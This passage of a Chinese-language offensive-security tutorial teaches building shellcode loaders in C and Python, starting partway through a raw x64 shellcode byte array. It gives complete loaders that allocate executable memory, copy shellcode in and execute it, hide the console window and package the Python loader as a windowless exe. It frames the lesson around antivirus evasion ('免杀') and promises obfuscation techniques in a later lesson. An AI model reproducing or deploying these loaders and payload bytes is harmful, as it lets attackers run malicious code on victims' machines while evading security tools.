class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//  void* Memory; //等价于PVOID，无类型指针</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>; <span class="comment">// P表示指针，PVOID表示 void * 无类型指针</span></span><br><span class="line">    Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">//  ShowWindow(GetConsoleWindow(), SW_HIDE);  //隐藏控制台窗口（二）</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())Memory)();<span class="comment">//跳到shellcode内存起始位置，开始执行shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h2><h3 id="include语法解释"><a href="#include语法解释" class="headerlink" title="include语法解释"></a>include语法解释</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>#include  叫做文件包含命令，用来引入对应的头文件（ .h 文件）。<br>#include  也是C语言预处理命令的一种。<br>#include  的处理过程很简单，就是将头文件的内容插入到该命令所在的位置，从而把头文件和当前源文件连接成一个源文件，这与复制粘贴的效果相同。<br>#include  的用法有两种，如下所示：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdHeader.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myHeader.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>使用尖括号 &lt; &gt; 和双引号 “ “ 的区别在于头文件的搜索路径不同：</p><ul><li>使用尖括号 &lt; &gt; ，编译器会到系统路径下查找头文件；</li><li>而使用双引号 “ “ ，编译器首先在当前目录下查找头文件，如果没有找到，再到系统路径下查找</li></ul><p>也就是说，使用双引号比使用尖括号多了一个查找路径，它的功能更为强大。<br>前面我们一直使用尖括号来引入标准头文件，现在我们也可以使用双引号了，如下所示：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>stdio.h  和 stdlib.h  都是标准头文件，它们存放于系统路径下，所以使用尖括号和双引号都能够成功引入；<br>而我们自己编写的头文件，一般存放于当前项目的路径下，所以不能使用尖括号，只能使用双引号。</p><h3 id="隐藏控制台"><a href="#隐藏控制台" class="headerlink" title="隐藏控制台"></a>隐藏控制台</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  <span class="comment">//设置连接器选项</span></span></span><br></pre></td></tr></table></figure><ol><li>控制台应用程序一般都会显示一个控制台窗口（虚拟DOS窗口，就是那种cmd黑窗），但很多时候控制台程序的执行逻辑根本不需要与用户进行交互，所以显示这个难看的窗口纯属多余，那么如何将它屏蔽掉呢？</li></ol><p>操作系统装载应用程序后，做完初始化工作就转到程序的入口点执行。程序的默认<strong>入口点</strong>实际上是由<strong>连接程序</strong>设置的，不同的连接器选择的<strong>入口函数</strong>也不尽相同。</p><p>注意这里涉及到两个词语：入口点和入口函数。&#x2F;subsystem定义入口点，&#x2F;entry定义入口函数</p><ol start="2"><li>具体设置哪个入口点是由连接器的 <code>&quot;/subsystem:&quot;</code>  选项参数确定的，它告诉操作系统如何运行编译生成的 .EXE  文件。</li></ol><p>可以指定四种方式： CONSOLE | WINDOWS | NATIVE | POSIX  如果这个选项参数的值为 WINDOWS ，则表示该应用程序运行时不需要控制台。</p><blockquote><p>有关连接器参数选项的详细说明请参考微软文档： <a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/subsystem-specify-subsystem?view=msvc-170">&#x2F;SUBSYSTEM（指定子系统） | Microsoft Docs</a></p></blockquote><ol start="3"><li>具体的入口函数设置：</li></ol><blockquote><ul><li>在VC下，连接器对控制台程序设置的入口函数是 mainCRTStartup ， mainCRTStartup  再调用你自己编写的 main  函数；</li><li>在图形用户界面（GUI）程序下，设置的入口函数是 WinMainCRTStartup ， WinMainCRTStartup  调用你自己写的 WinMain  函数。</li></ul></blockquote><ol start="4"><li><code>#pragma comment</code>的解释</li></ol><p>#pragma comment是#pragma下的一个子命令，使用注释方式引入库或<a href="https://baike.baidu.com/item/%E7%BC%96%E8%AF%91/1258343?fromModule=lemma_inlink">编译</a>目录。</p><p>#pragma comment是一个编译器指令，指示Visual C ++在生成的目标文件中留下注释。链接器在处理对象文件时可以读取该注释。</p><p>#pragma comment(lib, libname) 告诉链接器将’libname’库添加到库依赖关系列表中，就好像您已经将它添加到项目属性中一样 Linker-&gt;Input-&gt;Additional dependencies</p><blockquote><p>请参阅MSDN上的<a href="http://msdn.microsoft.com/en-us/library/7f0aews7(v=vs.120).aspx">#pragma-comment</a></p></blockquote><h3 id="ShowWindow-和GetConsoleWindow"><a href="#ShowWindow-和GetConsoleWindow" class="headerlink" title="ShowWindow()和GetConsoleWindow()"></a>ShowWindow()和GetConsoleWindow()</h3><p>ShowWindow()该函数可以控制窗口状态，GetConsoleWindow()获取到我们所需要控制的目的窗口的句柄</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ShowWindow</span>(<span class="built_in">GetConsoleWindow</span>(), SW_HIDE);</span><br></pre></td></tr></table></figure><p>GetConsoleWindow 函数 检索与调用进程关联的控制台所使用的窗口句柄</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows/console/getconsolewindow">https://docs.microsoft.com/zh-cn/windows/console/getconsolewindow</a></p></blockquote><p>ShowWindow 这个函数设置窗口的可视状态</p><blockquote><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型：</span></span><br><span class="line"><span class="function">BOOL <span class="title">ShowWindow</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hWnd, <span class="comment">// 指定要设定窗口的句柄 </span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> nCmdShow <span class="comment">// 指定窗口显示状态 </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数：hWnd 指定要设定窗口的句柄</li><li>参数： nCmdShow 指定了如何显示窗口。</li></ul><blockquote><p>它必须是下列值之一：  </p><ul><li>SW_HIDE               隐藏窗口并将活动状态传递给其它窗口。 </li><li>SW_MINIMIZE           最小化窗口并激活系统列表中的顶层窗口。 </li><li>SW_RESTORE            激活并显示窗口。如果窗口是最小化或最大化的，Windows恢复其原来的大小和位置。  </li><li>SW_SHOW               激活窗口并以其当前的大小和位置显示。 </li><li>SW_SHOWMAXIMIZED      激活窗口并显示为最大化窗口。 </li><li>SW_SHOWMINIMIZED      激活窗口并显示为图标。  </li><li>SW_SHOWMINNOACTIVE    将窗口显示为图标。当前活动的窗口将保持活动状态。 </li><li>SW_SHOWNA             按照当前状态显示窗口。当前活动的窗口将保持活动状态。 </li><li>SW_SHOWNOACTIVATE     按窗口最近的大小和位置显示。当前活动的窗口将保持活动状态。</li><li>SW_SHOWNORMAL         激活并显示窗口。如果窗口是最小化或最大化的，则Windows恢复它原来的大小和位置。</li></ul></blockquote><h3 id="无符号字节数组"><a href="#无符号字节数组" class="headerlink" title="无符号字节数组"></a>无符号字节数组</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned char buf[] = &quot;\xfc\x48\x83\xe4\xf0\xe8.....&quot;;</span><br></pre></td></tr></table></figure><p>无符号字节数组，给全部数组元素赋值，定义数组时可以不给出数组长度。</p><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个返回类型为 int  整型的 main()  函数， main  是任何程序执行的起点</p><h3 id="无类型指针"><a href="#无类型指针" class="headerlink" title="无类型指针"></a>无类型指针</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  void *Memory; //等价于PVOID，无类型指针</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>; <span class="comment">// P表示指针，PVOID表示 void * 无类型指针</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">声明一个无类型指针，可以采用以上两种方法</span><br><span class="line">void *Memory; 和 PVOID Memory = NULL;</span><br><span class="line"> P表示指针，PVOID表示 void * 无类型指针</span><br></pre></td></tr></table></figure><blockquote><p>C指针详解：</p><ul><li><a href="http://c.biancheng.net/view/228.html">http://c.biancheng.net/view/228.html</a> </li><li><a href="https://www.runoob.com/w3cnote/c-pointer-detail.html">https://www.runoob.com/w3cnote/c-pointer-detail.html</a></li></ul></blockquote><h3 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></table></figure><ol><li>简介</li></ol><p>简单来说就是分配内存的~~</p><p>此函数在调用进程的<strong>虚拟地址空间</strong>中保留或提交页面区域， VirtualAlloc  分配的内存被初始化为零</p><p>VirtualAlloc是win32的 <strong>api</strong>  函数，是用来申请动态内存的，动态内存我们可以通俗的理解为，主动式保护内存，可以根据我们自己决定是否存在;</p><ol start="2"><li>函数原型</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>参数</li></ol><ul><li>IpAddress：指向要分配内存的指定起始地址。一般为null，由系统自己分配</li></ul><blockquote><p>长指针。如果此参数为NULL，则由系统确定将区域分配到的位置。</p></blockquote><ul><li><p>dwSize：指定分配内存的大小（以字节为单位）。将此参数设置为0是错误的。</p></li><li><p>flAllocationType：指定分配内存的类型</p></li></ul><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>MEM_COMMIT</td><td>在内存中或磁盘上的页面文件中为页面的指定区域分配物理存储。尝试提交已提交的页面不会导致功能失败。这意味着可以提交一系列已提交或已取消提交的页面，而不必担心失败。</td></tr><tr><td>MEM_RESERVE</td><td>保留进程的虚拟地址空间范围，而不分配物理存储。保留范围在释放之前不能被任何其他分配操作（例如malloc和LocalAlloc函数）使用。保留的页面可以在对VirtualAlloc函数的后续调用中提交。</td></tr><tr><td>MEM_RESET</td><td>不支持。</td></tr><tr><td>MEM_TOP_DOWN</td><td>在可能的最高地址处分配内存。Windows Mobile中将忽略此标志。</td></tr></tbody></table><ul><li>flProtect：访问这块分配内存的权限。</li></ul><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>PAGE_EXECUTE</td><td>启用对页面的提交区域的执行访问。</td></tr><tr><td>PAGE_EXECUTE_READ</td><td>启用对页面的提交区域的执行和读取访问。尝试写入提交的区域会导致访问冲突。</td></tr><tr><td>PAGE_EXECUTE_READWRITE</td><td>启用对页面的提交区域的执行，读取和写入访问权限。</td></tr><tr><td>PAGE_GUARD</td><td>该区域中的页面将成为保护页面。</td></tr><tr><td>PAGE_NOACCESS</td><td>禁用对页面的提交区域的所有访问。尝试从提交的区域读取，写入或执行该操作会导致访问冲突异常，称为通用保护（GP）故障。</td></tr><tr><td>PAGE_NOCACHE</td><td>不允许缓存页面的提交区域。物理内存的硬件属性应指定为无高速缓存。</td></tr><tr><td>PAGE_READONLY</td><td>启用对页面的提交区域的读取访问。尝试写入提交的区域会导致访问冲突。如果系统区分只读访问和执行访问，则在提交区域执行代码的尝试将导致访问冲突。</td></tr><tr><td>PAGE_READWRITE</td><td>启用对页面的提交区域的读写访问。</td></tr></tbody></table><ol start="4"><li>返回值</li></ol><p>返回页面分配区域的基址表示成功。NULL表示失败。要获取扩展的错误信息，请调用 GetLastError 。</p><h4 id="申请虚拟内存"><a href="#申请虚拟内存" class="headerlink" title="申请虚拟内存"></a>申请虚拟内存</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *pMem = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure><h4 id="释放虚拟内存。"><a href="#释放虚拟内存。" class="headerlink" title="释放虚拟内存。"></a>释放虚拟内存。</h4><blockquote><p>注意：</p><ol><li>第三个参数一定要用 MEM_RELEASE ,而不能用 MEM_DECOMMIT ;</li><li>第二个参数一定要用0。</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VirtualFree(pMem, 0, MEM_RELEASE);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/aa908768(v=msdn.10)">https://docs.microsoft.com/zh-cn/previous-versions/aa908768(v=msdn.10)</a><br><a href="https://blog.csdn.net/weixin_41143631/article/details/87808495">https://blog.csdn.net/weixin_41143631/article/details/87808495</a></p></blockquote><h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy()"></a>memcpy()</h3><p>把shellcode写入内存</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br></pre></td></tr></table></figure><p>函数声明：</p><p>C 库函数 memcpy  从存储区 str2 复制 n 个字节到存储区 str1。</p><p>返回值：该函数返回一个指向目标存储区 str1 的指针。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(<span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span></span></span><br></pre></td></tr></table></figure><h3 id="void-Memory"><a href="#void-Memory" class="headerlink" title="((void(*)())Memory)();"></a>((void(*)())Memory)();</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">((<span class="built_in">void</span>(*)())Memory)();</span><br></pre></td></tr></table></figure><p>理解 ((void(*)())exec)();</p><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><p>如果变量 fp  是一个函数指针，那么如何调用 fp  所指向的函数呢？调用方法如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(*fp)();<span class="comment">// 标准的调用方法</span></span><br><span class="line"><span class="built_in">fp</span>();   <span class="comment">// 简写的调用方法，因为ANSI C标准允许程序员将上式简写</span></span><br></pre></td></tr></table></figure><p>因为 fp  是一个函数指针，那么 *fp  就是该指针所指向的函数，所以 (*fp)()  就是调用该函数的方式。</p><p>这里用一段代码来理解一下函数指针怎么用：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Max</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">int</span> (*p)(<span class="type">int</span>, <span class="type">int</span>);  <span class="comment">//定义一个函数指针</span></span><br><span class="line">    <span class="type">int</span> a, b, c, d;</span><br><span class="line">    p = Max;  <span class="comment">//把函数Max赋给指针变量p, 使p指向Max函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please enter a and b:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    c = <span class="built_in">p</span>(a, b);    <span class="comment">// 通过函数指针调用Max函数</span></span><br><span class="line">    d = (*p)(a, b); <span class="comment">// 这样调用也行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\nb = %d\nmax = %d,%d\n&quot;</span>, a, b, c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Max</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>  <span class="comment">//定义Max函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> z;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)&#123;</span><br><span class="line">        z = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        z = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">please enter a and b:3 4</span><br><span class="line">a = 3</span><br><span class="line">b = 4</span><br><span class="line">max = 4</span><br></pre></td></tr></table></figure><p>上面那段代码中， int (<em>p)(int, int); ，我们定义 p  是一个指向返回值为 int  类型的且有两个 int  类型参数的函数的指针。</em></p><p>现在我们搞简单点，如果 fp  是一个指向返回值为 void  类型的函数的指针，那么 (*fp)() 的值应为void ， fp 的声明如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void (*fp)();</span><br></pre></td></tr></table></figure><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><p>当我们知道如何声明一个给定类型的变量，那么该类型的类型转换符就很容易得到了：把声明中的变量名和声明结尾的分号去掉，再将剩余的部分用括号括起来就行。那么上面的 fp 的声明 void (*fp)();的类型转换符就可以得出来了，如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">void</span> (*)())</span><br><span class="line"><span class="comment">//表示一个 指向返回值为void类型的函数的指针</span></span><br></pre></td></tr></table></figure><p>到此为止，我们理解那段最终目标的代码所需要的前置知识已经全部复习完毕。</p><p>因此 ((void(*)())Memory)();  就可以拆开理解了</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(     (<span class="built_in">void</span>(*)())Memory    )();</span><br><span class="line"><span class="comment">// 先看中间部分，将Memory进行强制类型转化成一个函数指针（指向返回值为void类型的函数的指针）</span></span><br><span class="line"><span class="comment">// 此时 Memory 已经是一个函数指针了，现在回忆一下，刚刚我们是怎么调用 函数指针所指向的函数的呢？</span></span><br><span class="line"><span class="comment">// 没错，就是(*Memory)(); 或者直接使用简写 Memory();</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><a href="https://www.runoob.com/w3cnote/c-pointer-detail.html">C 指针详解</a></li><li><a href="http://c.biancheng.net/view/228.html">函数指针及其定义和用法，C语言函数指针详解</a></li></ul></blockquote><h1 id="shellcodeLoder-Python（学完python再来看）"><a href="#shellcodeLoder-Python（学完python再来看）" class="headerlink" title="shellcodeLoder-Python（学完python再来看）"></a>shellcodeLoder-Python（学完python再来看）</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes<span class="comment">#主要用到此库</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr), </span><br><span class="line"> buf, </span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>执行python的代码需要有python环境，但是呢，我们可以直接打包可执行程序~~~这样限制就少了一点</p><p>pyinstaller打包python代码为exe：</p><blockquote><ol><li>安装pyinstaller</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure><ol><li>打包python代码</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller.exe -F -w .\sc.py</span><br></pre></td></tr></table></figure></blockquote><p>需要注意的是~~同样这样打包生成的exe是无法免杀的<del>我们同样可以定位查杀特征进行混淆绕过</del>—同样下节课会讲到</p><h2 id="Python内存加载原理"><a href="#Python内存加载原理" class="headerlink" title="Python内存加载原理"></a>Python内存加载原理</h2><p>大部分脚本语言加载 shellcode 其实都是通过 c 的 ffi 去调用操作系统的api，因此只要知道 c 是如何加载 shellcode，那么其它的其实就都一样了。</p><ol><li>申请一片拥有可读可写可执行的内存区域</li><li>将 shellcode 载入到申请的内存区域</li><li>跳转到 shellcode 首地址开始执行</li></ol><h2 id="Ctypes库"><a href="#Ctypes库" class="headerlink" title="Ctypes库"></a>Ctypes库</h2><blockquote><p><a href="https://docs.python.org/zh-cn/3.7/library/ctypes.html">https://docs.python.org/zh-cn/3.7/library/ctypes.html</a></p></blockquote><p>ctypes  是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</p><ul><li>载入动态连接库</li></ul><p>ctypes  导出了 cdll  对象，在 Windows 系统中还导出了 windll  和 oledll  对象用于载入动态连接库。</p><p>通过操作这些对象的属性，你可以载入外部的动态链接库。</p><h2 id="转换数据类型"><a href="#转换数据类型" class="headerlink" title="转换数据类型"></a>转换数据类型</h2><p>因为后面要把shellcode载入内存，所以将shellcode转换为字节类型</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="设置VirtualAlloc返回类型"><a href="#设置VirtualAlloc返回类型" class="headerlink" title="设置VirtualAlloc返回类型"></a>设置VirtualAlloc返回类型</h2><p>要能在64位系统上运行，必须使用 restype  函数设置 VirtualAlloc  返回类型为 ctypes.c_unit64 ，否则默认是 32 位</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br></pre></td></tr></table></figure><h2 id="VirtualAlloc-函数申请内存"><a href="#VirtualAlloc-函数申请内存" class="headerlink" title="VirtualAlloc 函数申请内存"></a>VirtualAlloc 函数申请内存</h2><p>函数在调用进程的虚拟地址空间中保留或申请内存区域，VirtualAlloc分配的内存被初始化为零。python中采用ctypes调用VirtualAlloc 函数</p><ul><li>函数原型</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  LPVOID lpAddress,         #指向要分配内存的指定起始地址</span><br><span class="line">  DWORD dwSize,             #指定分配内存的大小</span><br><span class="line">  DWORD flAllocationType,   #指定分配内存的类型</span><br><span class="line">  DWORD flProtect           #该内存的初始保护属性</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解释：和上面c的函数原型很类似</span></span><br><span class="line"><span class="comment">#ctypes.c_int(0)：</span></span><br><span class="line">如果此参数为NULL，则系统确定内存分配将区域的位置，按<span class="number">64</span>-KB向上取整。</span><br><span class="line"><span class="comment">#ctypes.c_int(len(shellcode))：</span></span><br><span class="line">要分配或者保留的区域的大小，以字节为单位。</span><br><span class="line"><span class="comment">#ctypes.c_int(0x3000)====&gt;c里面的MEM_COMMIT | MEM_RESERVE</span></span><br><span class="line">分配类型值为 <span class="number">0x3000</span> ，是 MEM_COMMIT(<span class="number">0x1000</span>) 和 MEM_RESERVE(<span class="number">0x2000</span>)类型的合并</span><br><span class="line"><span class="comment">#ctypes.c_int(0x40)：</span></span><br><span class="line">访问类型值为 <span class="number">0x40</span> ，访问类型为 PAGE_EXECUTE_READWRITE ,此区域可读写执行。</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="https://baike.baidu.com/item/VirtualAlloc/1606859?fr=aladdin">https://baike.baidu.com/item/VirtualAlloc/1606859?fr=aladdin</a></p></blockquote><h2 id="将Shellcode载入内存"><a href="#将Shellcode载入内存" class="headerlink" title="将Shellcode载入内存"></a>将Shellcode载入内存</h2><p>调用 RtlMoveMemory  函数从指定内存中复制内容至另一内存</p><ul><li>函数原型（类似前面c中的memcpy()）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">RtlMoveMemory(</span><br><span class="line">    Destination,    <span class="comment">#指向要移动目的地址的指针</span></span><br><span class="line">    Source,         <span class="comment">#指向要复制的内存地址的指针</span></span><br><span class="line">    Length          <span class="comment">#指定复制内容的字节数</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr),</span><br><span class="line"> buf,</span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="CreateThread创建线程（开始执行）"><a href="#CreateThread创建线程（开始执行）" class="headerlink" title="CreateThread创建线程（开始执行）"></a>CreateThread创建线程（开始执行）</h2><p>创建一个线程从shellcode载入位置首地址开始执行。调用 CreateThread  将在主线程的基础上创建一个新线程</p><ul><li>函数原型</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HANDLE CreateThread(</span><br><span class="line">LPSECURITY_ATTRIBUTES lpThreadAttributes,   <span class="comment">#线程安全属性</span></span><br><span class="line">SIZE_T dwStackSize,                         <span class="comment">#设置初始栈的大小，以字节为单位</span></span><br><span class="line">LPTHREAD_START_ROUTINE lpStartAddress,      <span class="comment">#指向线程函数的指针</span></span><br><span class="line">LPVOID lpParameter,                         <span 